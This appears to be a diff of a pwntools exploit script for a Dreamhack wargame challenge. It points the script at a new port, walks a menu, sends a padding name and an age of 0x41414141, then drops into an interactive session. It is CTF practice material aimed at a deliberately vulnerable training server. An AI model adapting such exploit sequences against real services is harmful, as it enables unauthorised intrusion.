@@ -3,7 +3,15 @@
 import pwn
 
 #pwn.context.log_level = 'debug'
-p = pwn.remote("host1.dreamhack.games", 23487)
+p = pwn.remote("host1.dreamhack.games", 12083)
+
+dummy = "A"
+
+p.sendlineafter(">", '3')
+p.sendlineafter(">", '1')
+p.sendlineafter("Name: ", dummy * 0x10)
+p.sendlineafter("Age: ", '1094795585')
+p.sendlineafter(">", '2')
 
 p.interactive()
 
